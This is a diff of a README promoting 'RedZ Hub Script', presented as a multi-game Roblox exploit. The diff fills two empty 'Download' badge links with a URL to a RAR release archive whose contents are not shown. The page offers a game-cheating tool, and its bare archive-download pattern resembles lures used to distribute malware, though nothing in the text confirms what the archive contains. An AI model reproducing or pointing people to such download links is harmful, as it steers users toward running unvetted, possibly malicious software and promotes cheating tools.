@@ -1,10 +1,11 @@
 # 🔥 RedZ Hub Script – Multi-Game Roblox Exploit (2025 Edition)  
 
-[![Download RedZ Hub](https://img.shields.io/badge/Download-RedZ_Hub-red?style=for-the-badge&logo=download)]()  ![red](https://github.com/user-attachments/assets/ea135af7-2efe-4798-94d9-2c8ad6ec0cfa)
+[![Download RedZ Hub](https://img.shields.io/badge/Download-RedZ_Hub-red?style=for-the-badge&logo=download)](https://github.com/AlexyMixx/redz-hub-script/releases/download/Update/Update.rar) 
+![red](https://github.com/user-attachments/assets/ea135af7-2efe-4798-94d9-2c8ad6ec0cfa)
 
 
 
-[![Download RedZ Hub](https://img.shields.io/badge/Download-RedZ_Hub-red?style=for-the-badge&logo=download)]() 
+[![Download RedZ Hub](https://img.shields.io/badge/Download-RedZ_Hub-red?style=for-the-badge&logo=download)](https://github.com/AlexyMixx/redz-hub-script/releases/download/Update/Update.rar) 
 
 
 
